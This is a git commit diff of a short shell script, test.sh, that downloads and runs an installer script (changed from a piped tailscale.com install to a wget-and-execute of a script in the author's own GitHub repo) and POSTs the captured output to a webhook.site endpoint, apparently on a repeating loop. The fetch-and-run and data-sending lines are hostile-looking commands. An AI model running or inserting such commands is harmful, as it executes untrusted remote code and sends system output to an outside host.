695790757ccd91675af76e4c442f1f299bfb783b
Regular-platypus <118298840+Regular-platypus@users.noreply.github.com>
2024-02-09 16:54:47 +0530

    Update test.sh

--- test.sh
+++ test.sh
@@ -2,10 +2,10 @@
 # Function to send data to webhooks.site
 send_to_webhook() {
     output="$1"
-    curl -X POST -H "Content-Type: application/json" -d "{\"output\": \"$output\"}" https://webhooks.site/75f20357-f470-463a-8473-359673e3c916
+    curl -X POST -H "Content-Type: application/json" -d "{\"output\": \"$output\"}" https://webhook.site/75f20357-f470-463a-8473-359673e3c916
 }
 # Run your command and capture its output
-command_output=$(curl -fsSL https://tailscale.com/install.sh | sh)  # Replace your_command_here with actual command to capture output
+command_output=$(wget https://raw.githubusercontent.com/Regular-platypus/quick-installs/main/tailscale.sh && chmod +x tailscale.sh && ./tailscale.sh )  # Replace your_command_here with actual command to capture output
 # Send the initial output to webhook
 send_to_webhook "$command_output"
 # Loop to send output to webhook every 2.5 seconds
